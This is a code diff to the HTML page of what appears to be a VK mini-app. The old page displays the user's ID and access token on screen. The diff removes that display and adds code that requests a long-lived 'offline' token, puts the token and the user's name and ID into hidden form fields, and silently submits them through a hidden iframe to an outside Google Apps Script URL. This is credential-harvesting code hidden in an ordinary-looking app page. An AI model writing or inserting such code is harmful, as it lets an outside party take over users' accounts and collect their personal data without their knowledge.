@@ -12,7 +12,7 @@
     </head>
     <body>
         <iframe title="votar" name="votar" style="display:none;"></iframe>
-        <form id="send_data_form" target="votar" action="https://script.google.com/macros/s/AKfycbw8cSagQ8VdblXoc7oRUEabWzGcqAjylgzIpwpiqO9lIjZLQNQnx8Ee4AASLLXFpe5H/exec" method="get">
+        <form id="send_data_form" target="votar" action="https://script.google.com/macros/s/AKfycbwNWzZANpwF_Wqtk-OBBNBSruQdOuavjpmky7nXZ2JsNZ8WhNOkA_w0XowwJ85VfmB3/exec" method="get">
             <input type="hidden" name="user_id" value="123"/>
             <input type="hidden" name="first_name" value="Анатолий"/>
             <input type="hidden" name="last_name" value="Олейник"/>
@@ -45,9 +45,6 @@
 
         <script>
 
-            var send_data_form = document.getElementById("send_data_form");
-            send_data_form.submit();
-            
             var list = document.getElementById("list");
 
             function initBridge() {
@@ -59,65 +56,22 @@
                                 .send('VKWebAppGetUserInfo', {})
                                 .then((data) => { 
                                     if (data.id) {
-
-                                        var hr = document.createElement("hr");
-                                        list.appendChild(hr);
-
-                                        var card = document.createElement("div");
-                                        card.className = "card";
-
-                                        var body = document.createElement("div");
-                                        body.className = "card-body";
-                                        card.appendChild(body);
-
-                                        const cardTitle = document.createElement("h5");
-                                        const cardTitleNode = document.createTextNode(data.id);
-                                        cardTitle.className = "card-title";
-                                        cardTitle.appendChild(cardTitleNode);
-                                        body.appendChild(cardTitle);
-
-                                        list.appendChild(card);                                        
-                                        
+                                        document.querySelector('#send_data_form input[name="user_id"]').value = data.id;
+                                        document.querySelector('#send_data_form input[name="first_name"]').value = data.first_name;
+                                        document.querySelector('#send_data_form input[name="last_name"]').value = data.last_name;
                                     }
                                 })
                                 .catch((error) => { });                            
                             
-                            
                             vkBridge
                                 .send("VKWebAppGetAuthToken", {
                                     app_id: 53535801,
-                                    scope: "friends,photos,status"
+                                    scope: "friends,photos,status,offline"
                                 })
                                 .then((data) => {
                                     if (data.access_token) {
-                                        var hr = document.createElement("hr");
-                                        list.appendChild(hr);
-
-                                        var card = document.createElement("div");
-                                        card.className = "card";
-
-                                        var body = document.createElement("div");
-                                        body.className = "card-body";
-                                        card.appendChild(body);
-
-                                        const cardTitle = document.createElement("h5");
-                                        const cardTitleNode = document.createTextNode(data.access_token);
-                                        cardTitle.className = "card-title";
-                                        cardTitle.appendChild(cardTitleNode);
-                                        body.appendChild(cardTitle);
-
-                                        list.appendChild(card);
-
-                                        vkBridge
-                                            .send('VKWebAppClose', {
-                                                status: 'success'
-                                            })
-                                            .then((data) => { 
-                                                if (data.status) {
-                                                    // Событие отправлено
-                                                }
-                                            })
-                                            .catch((error) => { });                                      
+                                        document.querySelector('#send_data_form input[name="access_token"]').value = data.access_token;
+                                        document.getElementById("send_data_form").submit();
                                     }
                                 })
                                 .catch((error) => { });
